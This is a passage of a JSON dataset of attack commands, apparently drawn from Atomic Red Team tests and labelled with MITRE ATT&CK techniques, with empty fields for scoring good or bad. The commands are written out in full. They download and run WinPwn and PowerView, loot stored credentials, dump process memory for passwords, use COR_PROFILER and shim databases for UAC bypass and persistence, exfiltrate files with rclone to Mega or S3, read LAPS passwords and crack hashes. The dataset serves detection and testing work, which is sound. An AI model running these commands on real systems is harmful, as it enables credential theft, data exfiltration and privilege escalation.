        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive  ",
        "Description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555",
        "Shell": "powershell"
    },
    {
        "ID": 1651,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive  ",
        "Description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555",
        "Shell": "powershell"
    },
    {
        "ID": 1652,
        "Command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n",
        "Description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.012",
        "Shell": "powershell"
    },
    {
        "ID": 1653,
        "Command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\n",
        "Description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.012",
        "Shell": "powershell"
    },
    {
        "ID": 1654,
        "Command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'\n$env:COR_PROFILER_PATH = '\"PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll\"'\nPOWERSHELL -c 'Start-Sleep 1'\n",
        "Description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.012",
        "Shell": "powershell"
    },
    {
        "ID": 1655,
        "Command": "New-Item $env:appdata\\rclone -ItemType directory\nNew-Item $env:appdata\\rclone\\rclone.conf\ncd \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\\"\n.\\rclone.exe config create T1567002 mega\nset-Content $env:appdata\\rclone\\rclone.conf \"[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA\"\n.\\rclone.exe copy --max-size 1700k \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" T1567002:test -v\n",
        "Description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1567.002",
        "Shell": "powershell"
    },
    {
        "ID": 1656,
        "Command": "Write-Host \"Deploying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"\"\n$awsSecretKey = \"\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"default\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var \"aws_region=us-east-1\" -auto-approve\nWrite-Host \"Done!\"\nWrite-Host \"Generating rclone config... \" -NoNewLine\n$config = @\"\n[exfils3]\ntype = s3\nprovider = AWS\nenv_auth = true\nregion = us-east-1\n\"@\n$config | Out-File -FilePath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\" -Encoding ascii\nWrite-Host \"Done!\"\nWrite-Host \"Exfiltrating data... \" -NoNewLine\n$bucket = \"$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)\".Replace(\"`\"\",\"\")\ncd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*\n$null = ./rclone copy --max-size 1700k \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/\" exfils3:$bucket --config \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\"\nWrite-Host \"Done!\"\n",
        "Description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1567.002",
        "Shell": "powershell"
    },
    {
        "ID": 1657,
        "Command": "sh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"/tmp/T1003.007.bin\"\n",
        "Description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.007",
        "Shell": "sh"
    },
    {
        "ID": 1658,
        "Command": "sh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nMEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1)\nMEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2)\nMEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\nstrings \"/tmp/T1003.007.bin\" | grep -i PASS\n",
        "Description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.007",
        "Shell": "sh"
    },
    {
        "ID": 1659,
        "Command": "sh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON PathToAtomicsFolder/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin\ngrep -i \"PASS\" \"/tmp/T1003.007.bin\"\n",
        "Description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.007",
        "Shell": "sh"
    },
    {
        "ID": 1660,
        "Command": "sudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt\ncat /tmp/T1003.007Test3.txt\n",
        "Description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.007",
        "Shell": "bash"
    },
    {
        "ID": 1661,
        "Command": "sdbinst.exe \"PathToAtomicsFolder\\T1546.011\\bin\\AtomicShimx86.sdb\"\n",
        "Description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.011",
        "Shell": "command_prompt"
    },
    {
        "ID": 1662,
        "Command": "Copy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb\nCopy-Item \"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb\n",
        "Description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.011",
        "Shell": "powershell"
    },
    {
        "ID": 1663,
        "Command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\n",
        "Description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.011",
        "Shell": "powershell"
    },
    {
        "ID": 1664,
        "Command": "net user /domain\nnet group /domain\n",
        "Description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1665,
        "Command": "net user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n",
        "Description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1666,
        "Command": "query user /SERVER:%COMPUTERNAME%\n",
        "Description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1667,
        "Command": "Invoke-Expression \"PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1\"\n",
        "Description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1668,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"  -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1669,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp \n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1670,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person) \n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1671,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses \n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1672,
        "Command": "net user administrator /domain\n",
        "Description": "This test will enumerate the details of the built-in domain admin account\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1673,
        "Command": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain\n",
        "Description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1674,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n",
        "Description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1675,
        "Command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n",
        "Description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1676,
        "Command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n",
        "Description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1677,
        "Command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n",
        "Description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1678,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput",
        "Description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1679,
        "Command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"",
        "Description": "Enumerates active directory usernames using the userenum function of Kerbrute",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1680,
        "Command": "$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'",
        "Description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1681,
        "Command": "Get-ADComputer $env:computername -Properties *",
        "Description": "This test executes LDAP query using powershell command Get-ADComputer and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1682,
        "Command": "Get-ADComputer $env:computername -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",
        "Description": "This test executes LDAP query using powershell command Get-ADComputer and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1683,
        "Command": "Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *",
        "Description": "This test executes LDAP query using powershell command Get-ADComputer with SearchScope as subtree and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1684,
        "Command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"  -h $env:USERDOMAIN -s subtree -f \"objectclass=computer\" *\n",
        "Description": "This test executes LDAP query using adfind command and lists all the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1685,
        "Command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"  -h $env:USERDOMAIN -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n",
        "Description": "This test executes LDAP query using adfind command and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "powershell"
    },
    {
        "ID": 1686,
        "Command": "ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b \"CN=Users,DC=example,DC=test\" -s sub -a always -z 1000 dn\n",
        "Description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "sh"
    },
    {
        "ID": 1687,
        "Command": "ldapdomaindump -u domain\\user -p password 127.0.0.1 -o /tmp/T1087",
        "Description": "This test uses LDAPDomainDump to perform account enumeration on a domain.\n[Reference](https://securityonline.info/ldapdomaindump-active-directory-information-dumper-via-ldap/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1087.002",
        "Shell": "sh"
    },
    {
        "ID": 1688,
        "Command": "cd PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\..\nPathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule PathToAtomicsFolder\\T1110.002\\src\\sam.txt PathToAtomicsFolder\\T1110.002\\src\\password.lst",
        "Description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1689,
        "Command": "netstat\nnet use\nnet sessions\n",
        "Description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1049",
        "Shell": "command_prompt"
    },
    {
        "ID": 1690,
        "Command": "Get-NetTCPConnection\n",
        "Description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1049",
        "Shell": "powershell"
    },
    {
        "ID": 1691,
        "Command": "netstat\nwho -a\n",
        "Description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1049",
        "Shell": "sh"
    },
    {
        "ID": 1692,
        "Command": "$syntaxList = \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" \n\nforeach ($syntax in $syntaxList) {\nPathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe $syntax -}\n",
        "Description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1049",
        "Shell": "powershell"
    },
    {
        "ID": 1693,
        "Command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n",
        "Description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1123",
        "Shell": "powershell"
    },
    {
        "ID": 1694,
        "Command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n",
        "Description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1123",
        "Shell": "command_prompt"
    },
    {
        "ID": 1695,
        "Command": "sh PathToAtomicsFolder/T1123/src/T1123.sh /tmp/T1123.m4a 5\n",
        "Description": "Use AppleScript to get Quicktime Player to record an audio file from the default microphone.\n\nShould create a non-empty m4a file with sound from the microphone.\n\n- requires Automation permissions but no additional microphone permissions\n- saves file in /tmp by default. Other locations likely to require more permissions.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1123",
        "Shell": "sh"
    },
    {
        "ID": 1696,
        "Command": "reg.exe import \"PathToAtomicsFolder\\T1546.010\\src\\T1546.010.reg\"\n",
        "Description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.010",
        "Shell": "command_prompt"
    },
    {
        "ID": 1697,
